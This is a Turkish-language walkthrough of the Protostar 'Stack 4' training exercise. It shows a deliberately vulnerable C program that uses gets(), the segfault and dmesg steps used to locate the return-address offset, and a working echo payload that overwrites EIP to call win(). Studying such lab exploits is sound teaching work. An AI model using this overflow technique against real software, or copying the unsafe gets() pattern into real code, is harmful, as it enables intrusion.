---
title: "Stack 4"
etiketler : "Protostar"
seriler: "Protostar"
sakla  : false
---

# Stack4.c

``` C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

**Önceki seviyeden farkı burada fp yok!**

**Amaç:** main fonksiyonu içerisinde ki stack taşırılarak `eip` değerini
değiştirip programın akışına manipüle etmek.

# Programın Çalıştırılması
``` text
user@protostar:/opt/protostar/bin$ ./stack4
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
user@protostar:/opt/protostar/bin$ ./stack4
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDD
Segmentation fault
```
Önceki seviyede fp değişkenini değiştirerek istediğimiz adresteki fonksiyonu
çalıştırabiliyorduk fakat bu seviyede böyle bir imkanımız olmadığı için eip
registerinin stackteki yerini istediğimiz şekilde doldurarak programın akışını
değiştireceğiz.

Programlarda genellikle bir fonksiyon çağırıldığı zaman o fonksiyona girilmeden
önce çalıştırılan fonksiyondan sonra, geri döneceği adresi stacke atar
böylelikle hem fonksiyonların lokal değişkenleri birbirine karışmamış ve
gereksiz yer kaplamamış olur.

# Dönüş adresini tespit etmek

Önceki seviyeden daha uzun bir karakter dizisi kullanıyorum çünkü önceki
seviyedeki gibi lokal değişkeni değil lokal değişkenlerden önce stackte yer
kaplayan dönüş adresini değiştireceğiz. Genellikle Segmentation Fault alana
kadar A ekleyip sonrasına 4 bytelık farklı karakterler ekliyorum.

``` text
user@protostar:/opt/protostar/bin$ ./stack4
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFF
Segmentation fault
user@protostar:/opt/protostar/bin$ dmesg | tail -1
[16102.708303] stack4[1893]: segfault at 45454545 ip 45454545 sp bffffce0 error 4
```

Programa yukarıdaki gibi uzun bir string verdikten sonra segmentation fault
alıyoruz ve dmesg çıktısına baktığımızda `ip` registerinin `45454545` olduğunu
görüyoruz.

``` python
>>> print( chr(0x45) )
E
```

`0x45`'in E karakterine ait olduğunu tespit ettikten sonra atlamak istediğimiz
fonksiyonun adresini bulmamız gerekiyor.

Hızlıca önceki seviyede yaptığım gibi win fonksiyonunun adresini tespit
ediyorum.


``` text
user@protostar:/opt/protostar/bin$ objdump -S stack4 | grep win
080483f4 <win>:
```

win fonksiyonunun yerini `080483f4` olarak not ediyoruz.

# Programın Akışının Değiştirilmesi

Programa verdiğim 76 adet "A" karakteirnin sonuna bu adresi ekliyorum.

```
user@protostar:/opt/protostar/bin$ echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf4\x83\x04\x08" | ./stack4
code flow successfully changed
Segmentation fault
```

Böylelikle fonksiyondan çıkarkan eip'ye atanan değişkeni `080483f4` değerine
döndürüp bu adresteki fonksiyonu çalıştırabiliyoruz.
